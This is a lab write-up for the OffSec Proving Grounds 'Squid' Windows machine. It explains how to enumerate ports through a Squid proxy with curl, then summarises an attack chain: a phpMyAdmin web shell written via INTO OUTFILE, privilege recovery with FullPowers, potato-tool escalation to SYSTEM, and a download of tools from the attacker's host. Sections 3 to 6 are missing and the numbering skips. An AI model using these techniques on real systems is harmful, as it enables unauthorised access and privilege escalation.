# Squid — OffSec (Windows · Hard)

> **Platform:** Offensive Security Proving Grounds  
> **OS:** Windows Server 2019 (10.0.17763)  
> **Difficulty:** Hard  
> **Target IP:** `192.168.208.189`  
> **Attacker IP:** `192.168.45.206`

---

## Overview

In this lab, we enumerate ports behind a Squid proxy to gain an initial foothold through phpMyAdmin. Privileges are then elevated by creating scheduled tasks to enable restricted privileges. This lab focuses on exploiting proxy configurations and privilege escalation methods.

### Learning Objectives

After completion of this lab, learners will be able to:

- Enumerate open ports behind the Squid proxy to identify accessible services.
- Exploit phpMyAdmin to upload a web shell and establish a reverse shell as `LOCAL SERVICE`.
- Recover default `LOCAL SERVICE` privileges using a scheduled task.
- Enable the `SeImpersonatePrivilege` via a scheduled task with a crafted Principal.
- Use PrintSpoofer / GodPotato to exploit `SeImpersonatePrivilege` and achieve `SYSTEM`-level access.

### Lab Description

This lab demonstrates using a Squid proxy to enumerate open ports on a target and gain initial access via phpMyAdmin with default credentials. Learners will escalate privileges by recovering restricted `LOCAL SERVICE` privileges through scheduled tasks. Finally, they will exploit `SeImpersonatePrivilege` using PrintSpoofer / GodPotato to achieve a `SYSTEM` shell. The lab emphasizes proxy exploitation, privilege recovery, and abuse of impersonation rights.

## 2 · Understanding the Squid Proxy (Learning Notes)

**Squid is a proxy server.** In this lab its importance is that the target's Squid service can potentially make HTTP connections to services that **you cannot directly reach from Kali**.

Think of it as a **middleman**.

### Without Squid

Normally, Kali directly connects to the target port:

```
Kali ────────────────> Target:8080
```

If a firewall blocks 8080:

```
Kali ───────X───────> Target:8080
```

You can't access it.

### With Squid

Your connection becomes:

```
Kali
  │
  │ HTTP request
  ▼
Target:3128
  │
  │ Squid makes the request
  ▼
Target:8080
```

So **Kali isn't directly connecting to 8080**. Instead, you're saying to Squid:

> "Hey Squid, please fetch `http://192.168.208.189:8080` for me."

Squid then makes that connection itself.

### Why This Matters for Enumeration

Your Nmap scan from Kali sees only the ports that are reachable **from Kali's network position**. But Squid is running **on the target**. Therefore:

```
             TARGET
       ┌─────────────────┐
       │                 │
Kali ──┤ Squid :3128     │
       │       │         │
       │       ├──> :8080│
       │       ├──> :8081│
       │       └──> :9000│
       │                 │
       └─────────────────┘
```

That's why the lab tells you to **enumerate ports behind the Squid proxy**.

### How Did We Know to Check Port 8080?

**We didn't actually discover port 8080 from the Nmap scan.** 8080 was used as an **example** of a possible hidden web port.

Our original scan showed:

```
135/tcp
139/tcp
445/tcp
3128/tcp   ← Squid
49666/tcp
49667/tcp
```

There is **no 8080** in that output.

### Discovering Hidden Ports Through the Proxy

We need to ask the **Squid proxy to connect to different ports** and see which ones respond.

For example:

```bash
curl -x http://192.168.208.189:3128 http://192.168.208.189:8080/
```

This means:

> Kali → Squid:3128 → Target:8080

8080 is a common alternative HTTP/web port. We could similarly test:

```
80
81
443
8000
8080
8081
8888
8443
```

Example manual tests:

```bash
curl -x http://192.168.208.189:3128 http://192.168.208.189:8000/
curl -x http://192.168.208.189:3128 http://192.168.208.189:8080/
curl -x http://192.168.208.189:3128 http://192.168.208.189:8081/
```

### Automating Port Enumeration Through Squid

Rather than manually guessing hundreds of ports, we automate the requests:

```bash
for port in 80 81 443 8000 8008 8080 8081 8888 8443; do
    echo "===== $port ====="
    curl -x http://192.168.208.189:3128 \
         --connect-timeout 2 \
         -s -o /dev/null \
         -w "%{http_code}\n" \
         http://192.168.208.189:$port/
done
```

Then investigate the ports that produce interesting responses.

> [!NOTE] Key Distinction
> ```
> Normal Nmap:
> Kali ──────────> Target:PORT
>        direct
> 
> Through Squid:
> Kali ──> Squid:3128 ──> Target:PORT
>                          ↑
>                    test hidden ports
> ```
> **8080 wasn't discovered beforehand; it was just a common port we chose to test.** The lab's objective is for you to discover which port behind Squid hosts phpMyAdmin.

> ```

> ```

## 7 · Lessons Learned

1. **Always enumerate through proxies.** Nmap only shows ports reachable from your network position. A proxy running on the target can relay requests to internal services invisible to external scans. Use `curl -x` or automated scripts to probe common ports through the proxy.
2. **Default credentials still work.** phpMyAdmin with `root` / empty password gave us full database access and the ability to write arbitrary files to disk via `SELECT … INTO OUTFILE`.
3. **`LOCAL SERVICE` tokens are often stripped.** Windows service accounts frequently have their default privileges stripped at process creation. FullPowers restores them by creating a scheduled task that spawns a new process with the full default token.
4. **`SeImpersonatePrivilege` is game over.** Once this privilege is recovered, potato-family tools (GodPotato, PrintSpoofer, SweetPotato, etc.) trivially escalate to `SYSTEM` by abusing DCOM/named pipe impersonation.
5. **Use `where /r C:\ filename` for fast flag hunting.** Much faster than manually traversing directories with `cd` and `dir`.
6. **FoxyProxy configuration caveat.** Remember to disable the proxy when done — it routes *all* browser traffic through the target, breaking normal web access.
7. **File transfer workflow.** Use `python3 -m http.server 8000` on Kali + `curl http://KALI_IP:8000/file -o file` on Windows CMD for quick file transfers.
